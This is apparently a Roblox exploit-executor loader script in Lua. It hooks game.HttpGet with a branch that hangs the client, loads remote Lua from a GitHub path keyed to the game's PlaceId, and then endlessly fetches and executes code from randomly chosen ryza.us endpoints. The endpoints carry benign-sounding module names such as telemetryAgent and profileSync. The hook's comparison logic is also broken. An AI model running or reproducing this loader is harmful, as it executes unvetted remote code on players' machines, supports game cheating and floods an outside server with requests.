if hookfunction and newcclosure then
    local originalHttpGet = game.HttpGet
    hookfunction(game.HttpGet, newcclosure(function(self, ...)
        if self == game then
            local url = select(1, ...)
            if url == originalHttpGet then
                while true do end
                return nil
            end
        end
        return originalHttpGet(self, ...)
    end))
end

local success, error = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/78637bcawubsg76c73/games/" .. game.PlaceId .. ".lua"))()
end)

if not success then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/78637bcawubsg76c73/games/null.lua"))()
end

local urlsToRequest = {
    "https://ryza.us/api/getscript/loader/v2/utilityCore",
    "https://ryza.us/api/getscript/loader/v2/gameHandler",
    "https://ryza.us/api/getscript/loader/v2/systemInit",
    "https://ryza.us/api/getscript/loader/v2/configManager",
    "https://ryza.us/api/getscript/loader/v2/resourcePack",
    "https://ryza.us/api/getscript/loader/v2/clientModule",
    "https://ryza.us/api/getscript/loader/v2/networkHelper",
    "https://ryza.us/api/getscript/loader/v2/assetLoader",
    "https://ryza.us/api/getscript/loader/v2/uiFramework",
    "https://ryza.us/api/getscript/loader/v2/dataService",
    "https://ryza.us/api/getscript/loader/v2/renderEngine",
    "https://ryza.us/api/getscript/loader/v2/cacheSystem",
    "https://ryza.us/api/getscript/loader/v2/inputManager",
    "https://ryza.us/api/getscript/loader/v2/soundController",
    "https://ryza.us/api/getscript/loader/v2/telemetryAgent",
    "https://ryza.us/api/getscript/loader/v2/updateChecker",
    "https://ryza.us/api/getscript/loader/v2/profileSync",
    "https://ryza.us/api/getscript/loader/v2/mainHandler",
    "https://ryza.us/api/getscript/loader/v2/settingsModule",
    "https://ryza.us/api/getscript/loader/v2/eventBroker"
}

local function getRandomUrl()
    local randomIndex = math.random(1, #urlsToRequest)
    return urlsToRequest[randomIndex]
end

while wait() do
    pcall(function()
        loadstring(game:HttpGet(getRandomUrl()))()
    end)
end
